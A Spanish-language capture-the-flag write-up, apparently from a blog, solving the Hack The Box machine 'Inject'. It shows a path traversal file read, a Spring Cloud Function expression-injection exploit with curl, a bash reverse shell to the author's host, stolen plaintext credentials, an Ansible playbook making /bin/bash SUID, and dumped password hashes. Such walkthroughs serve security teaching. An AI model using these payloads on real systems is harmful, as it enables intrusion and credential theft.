---
layout: single
title: Inject - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Inject de la plataforma de Hackthebox donde nos aprovecharemos de un campo de subida de archivos para subir una imagen y aprovecharnos de que se esta empleando un parámetro que se llama img lo convertiremos a un Local File Inclusion para leer archivos de la maquina y así poder explotar la vulnerabilidad CVE-2022-22693 ya que se esta empleando Java Spring Framework podremos hacer un remote code execution para ganar acceso ala maquina una vez dentro encontraremos las credenciales de un usuario al cual migraremos para posteriormente nos aprovecharemos de una tarea cron que ejecuta archivos yml para definir el de nosotros y hacer la bash SUID y convertirnos en root"
date: 2023-07-08
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-inject/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - LFI
  - Asinble-playbook
  - CVE-2022-22693
---

<p align="center">
<img src="/assets/images/htb-writeup-inject/banner.png">
</p>

```bash
❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=95.1 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 95.050/95.050/95.050/0.000 ms
❯ whichSystem.py 10.10.11.204

10.10.11.204 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 11:41 CST
Nmap scan report for 10.10.11.204
Host is up (0.19s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Solo vemos 2 puertos abiertos así que vamos a enumerar por el puerto **8080** ya que nos contamos con credenciales para enumerar en el puerto **22** que corresponde a **SSH**

```ruby
❯ whatweb http://10.10.11.204:8080
http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
```

Vemos la web y se ve que tiene varias rutas 

![](/assets/images/htb-writeup-inject/web1.png)

Si vamos ala parte de `register` no funciona

![](/assets/images/htb-writeup-inject/web2.png)

Pero también hay un campo de subida de archivos

![](/assets/images/htb-writeup-inject/web3.png)

Antes de empezar a hacer pruebas con la parte de la subida de archivos lo que podemos hacer es **Fuzzing** para ver que no nos hemos dejado nada

```python
❯ dirsearch -u http://10.10.11.204:8080

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.204:8080/_23-07-07_11-50-31.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-07-07_11-50-31.log

Target: http://10.10.11.204:8080/

[11:50:31] Starting: 
[11:50:50] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[11:50:52] 400 -  435B  - /a%5c.aspx
[11:51:12] 200 -    5KB - /blogs
[11:51:22] 500 -  106B  - /error
[11:51:22] 500 -  106B  - /error/
[11:51:42] 200 -    6KB - /register
[11:51:50] 200 -    2KB - /upload
[11:51:51] 200 -    2KB - /upload/

Task Completed
```

Bueno como tal la ruta **blog** no tiene nada interesante

![](/assets/images/htb-writeup-inject/web4.png)

Vamos a subir cualquier **imagen**

![](/assets/images/htb-writeup-inject/web5.png)

Y funciona

![](/assets/images/htb-writeup-inject/web6.png)

Bueno yo como tal tuve que subir otra imagen ya que no se por que la otra me daba error pero le tome una captura de pantalla ala web, si le damos **click** al `link` nos lleva aquí

![](/assets/images/htb-writeup-inject/web7.png)

## Local File Inclusion (LFI)

Pues bueno la `url` ya es interesante ya que se esta empleando un parámetro `img` vamos a probar haciendo un **LFI** para ver si podemos ver el `/etc/passwd`

Si de primeras apuntamos al archivo nos da error 

![](/assets/images/htb-writeup-inject/web8.png)

A si que vamos a hacer un **directory path traversal** para ir varios directorios hacia atrás 

Para mas cómodo podemos hacerlo desde consola

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd" | grep sh
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

Pues bueno funciona y como tal tenemos el nombre de 2 usuarios **frank** y **phil** 

Y bueno tenemos capacidad de **directory listing** y podemos ver lo que hay en el directorio de **phil**

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/phil"
.ansible
.bash_history
.bashrc
.cache
.local
.profile
.ssh
.viminfo
user.txt
```

Si intentamos ver algún archivo no podremos verlo intente con la **flag** pero nada

Algo que podemos hacer es comenzara enumerar podemos empezar con la ruta `var`

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../var"
backups
cache
crash
lib
local
lock
log
mail
opt
run
spool
tmp
www
^C
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../var/www"
html
WebApp
```

Y bueno ya vemos 2 directorios interesantes **html** y **WebApp** vamos a entrar en `WebApp` y vemos varios archivos interesantes entre ellos un **pom.xml** 

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp"
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

Bueno vemos básicamente que se esta usando `Java` que es un lenguaje de programación y `Spring`

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml"
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

![](/assets/images/htb-writeup-inject/web9.png)

Si seguimos enumerando encontramos que el usuario `Frank` ejecuta `java`

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../etc/systemd/system/webapp.service"
[Unit]
Description=Spring WEb APP
After=syslog.target

[Service]
User=frank
Group=frank
ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
Restart=always
StandardOutput=syslog
StandardError=syslog

[Install]
WantedBy=multi-user.target
```

## Shell as frank 

Si buscamos por vulnerabilidades para la versión de que encontramos esto <https://sysdig.com/blog/cve-2022-22963-spring-cloud/>

Ya nos están dando instrucciones de como hacerlo

![](/assets/images/htb-writeup-inject/web10.png)

Lo que vamos a hacer es enviar una petición por el método `post` y tenemos que pasarle un argumento con `java` y vamos a crear un archivo en el sistema para subir una reverse shell 

```bash
❯ curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/rev")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/rev")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Fri, 07 Jul 2023 18:43:18 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-07-07T18:43:18.469+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Ahora para asegurarnos que se creo podemos aprovecharnos del `LFI` para ver si bajo la ruta `tmp` se creo `rev` <span style="color:yellow">Ignoren los demas archivos o carpetas creadas son de otros usuarios aveces estos problemas pasan por que estamos en la misma region o yo que se</span> ![](/assets/images/htb-writeup-inject/xd.png)

```bash
 curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../tmp"
.font-unix
.ICE-unix
.Test-unix
.X11-unix
.XIM-unix
ansible_ansible.legacy.command_payload_j2q466ie
DnPTN
hsperfdata_frank
mazajo_test
mazajo.sh
nNuQH.b64
pspy64
pwned
recond
rev
rev.sh
reverse.sh
systemd-private-146c32063ab54e548fcb1ba34f876d3b-ModemManager.service-Ou3fni
systemd-private-146c32063ab54e548fcb1ba34f876d3b-systemd-logind.service-b71gZf
systemd-private-146c32063ab54e548fcb1ba34f876d3b-systemd-resolved.service-sTUibi
systemd-private-146c32063ab54e548fcb1ba34f876d3b-systemd-timesyncd.service-Hqsmuf
systemd-private-146c32063ab54e548fcb1ba34f876d3b-upower.service-HOXmQg
test.txt
tmp.HifDEiYMkf
tomcat.8080.2420306893279265226
tomcat-docbase.8080.10176803267819659705
vmware-root_740-2999460834
```

Bueno como se creo ahora vamos a hacer un archivo que contenga la reverse shell en **Bash** para ganar acceso al sistema pero vamos a ponerle un nombre diferente a todos esos que están hay

```bash
❯ nano enviame.sh
❯ catn enviame.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.213/443 0>&1
```

Ahora vamos a ejecutar un servidor `http` con `Python3`

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Y nos vamos a poner en escucha

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Ahora vamos a subir el archivo mediante una petición por `curl` y lo guardaremos en la carpeta que creamos

```bash
❯ curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.213:8080/enviame.sh -o /tmp/rev")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.213:8080/enviame.sh -o /tmp/rev")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Fri, 07 Jul 2023 19:06:16 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-07-07T19:06:16.502+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.204 - - [07/Jul/2023 13:06:23] "GET /enviame.sh HTTP/1.1" 200 -
```

Ahora vamos a validar que se subió

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../tmp/rev"
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.213/443 0>&1
```

Y bueno ahora ganamos acceso

```bash
❯ curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Fri, 07 Jul 2023 19:07:53 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-07-07T19:07:53.249+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Y tenemos la reverse Shell

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.204 38528
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
frank
bash-5.0$ 
```

Ahora hacemos lo siguiente para poder hacer `CTRL+C`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.204 38528
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
frank
bash-5.0$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash-5.0$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
bash-5.0$ export TERM=xterm
```

Pues bueno no vemos la flag

```bash
bash-5.0$ ls -la
total 36
drwxr-xr-x 7 frank frank 4096 Jul  7 17:55 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
drwxr-xr-x 3 frank frank 4096 Jul  7 05:20 .ansible
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 2 frank frank 4096 Jul  7 17:57 .ssh
bash-5.0$ 
```

Si la buscamos tendremos que convertirnos en el otro usuario  

```bash
bash-5.0$ find / -name user.txt -type f 2>/dev/null
/home/phil/user.txt
bash-5.0$ 
```

## Shell as phil

Si nos vamos al directorio de `frank` vemos un `.m2`

```bash
bash-5.0$ ls -la
total 36
drwxr-xr-x 7 frank frank 4096 Jul  7 17:55 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
drwxr-xr-x 3 frank frank 4096 Jul  7 05:20 .ansible
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwxr-xr-x 2 frank frank 4096 Jul  7 17:57 .ssh
```

Si investigamos que es **Chat GPT** nos dice lo siguiente

![](/assets/images/htb-writeup-inject/web11.png)

Si entramos vamos un archivo `xml` que llama la atención

```bash
bash-5.0$ ls -la
total 12
drwx------ 2 frank frank 4096 Feb  1 18:38 .
drwxr-xr-x 7 frank frank 4096 Jul  7 17:55 ..
-rw-r----- 1 root  frank  617 Jan 31 16:55 settings.xml
bash-5.0$ pwd
/home/frank/.m2
bash-5.0$ 
```

Encontramos las credenciales del usuario **phil**

```bash
bash-5.0$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
bash-5.0$ 
```

Las credenciales funcionan

```bash
bash-5.0$ su phil
Password: 
bash-5.0$ whoami
phil
bash-5.0$ 
```

## User.txt

Aquí vemos la flag

```bash
bash-5.0$ pwd
/home/phil
bash-5.0$ cat user.txt 
1451ef89abda3eb1eecd7e4329a90f0f
bash-5.0$ 
```

## Escalada de privilegios

No vemos nada interesante 

```bash
bash-5.0$ find \-perm -4000 2>/dev/null
./usr/bin/su
./usr/bin/fusermount
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/at
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/umount
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/mount
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
bash-5.0$ 
```

```bash
bash-5.0$ getcap / -r 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
bash-5.0$ 
```

Vamos a subir el `pspy` para mirar tareas `cron` <https://github.com/DominicBreuker/pspy/releases>

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.204 - - [07/Jul/2023 13:28:36] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
bash-5.0$ cd /dev/shm/
bash-5.0$ pwd
/dev/shm
bash-5.0$ wget http://10.10.14.213:8080/pspy64
--2023-07-07 19:28:29--  http://10.10.14.213:8080/pspy64
Connecting to 10.10.14.213:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M   931KB/s    in 3.3s    

2023-07-07 19:28:32 (931 KB/s) - ‘pspy64’ saved [3104768/3104768]

bash-5.0$ chmod +x pspy64 
bash-5.0$ 
```

Ahora lo corremos 

```bash
bash-5.0$ ./pspy64 
```

Bueno vemos que se esta corriendo `ansible-parallel` a cualquier archivo `.yml` bajo esa ruta 

![](/assets/images/htb-writeup-inject/web12.png)

Y bueno también hay vemos que se esta haciendo una copia de un `yml` de `root` al directorio `/opt/automation/tasks/` ![](/assets/images/htb-writeup-inject/web13.png)

Y efectivamente hay esta 

```bash
bash-5.0$ cd /opt/automation/tasks/
bash-5.0$ ls -la
total 24
drwxrwxr-x 2 root staff  4096 Jul  7 19:32 .
drwxr-xr-x 3 root root   4096 Oct 20  2022 ..
-rw-r--r-- 1 root root    150 Jul  7 19:32 playbook_1.yml
-rw-r--r-- 1 phil phil  12288 Jul  7 12:30 .playbook.yml.swp
bash-5.0$ 
```

Vamos a crear nuestro propio `.yml` bajo esa ruta basándonos en el siguiente ejemplo

```bash
bash-5.0$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
bash-5.0$ 
```

![](/assets/images/htb-writeup-inject/web14.png)

```bash
bash-5.0$ cat pe.yml 
- hosts: localhost
  tasks:
  - name: Escalada de privilegios
    ansible.builtin.shell:
      chmod +s /bin/bash
    become: true
bash-5.0$ 
```

Ahora vamos a esperar a que se ejecute la tarea para que la **bash** sea **SUID**

```bash
bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash-5.0$ 
```

## Shell as root && root.txt

Ahora nos convertimos en **root** y vemos la **flag**

```bash
bash-5.0$ bash -p
bash-5.0# cd /root
bash-5.0# cat root.txt 
d67f223f791dd5a6f46cf0672ed04953
bash-5.0# hostname -I
10.10.11.204 dead:beef::250:56ff:feb9:1fd4 
bash-5.0#
```

```bash
bash-5.0# cat /etc/shadow
root:$6$KeHoGfvAPeHOqplu$tC/4gh419crGM6.btFzCazMPFH0gaX.x/Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
landscape:*:19046:0:99999:7:::
pollinate:*:19046:0:99999:7:::
usbmux:*:19090:0:99999:7:::
systemd-coredump:!!:19090::::::
frank:$6$fBwyjkLHtSuUCpHx$6G9LujV0iop.QxbfQpwDcSaRWDDobBlVMo5.6gVJVnQabcbmFwdkwFfmJNAX27u3Cdg9ZO5977pCst7hF98kc/:19381:0:99999:7:::
lxd:!:19090::::::
sshd:*:19260:0:99999:7:::
phil:$6$Z.KhzrHH6PXCuNbO$dL9xyMTydwjYPcrunZb7OO9a0hCwrUPOeQfdum818rW4NPtsiXEji15NMmikgYBGLDbWPUfLIpCpOuCRxYedM.:19388:0:99999:7:::
fwupd-refresh:*:19389:0:99999:7:::
_laurel:!:19389::::::
bash-5.0#
```
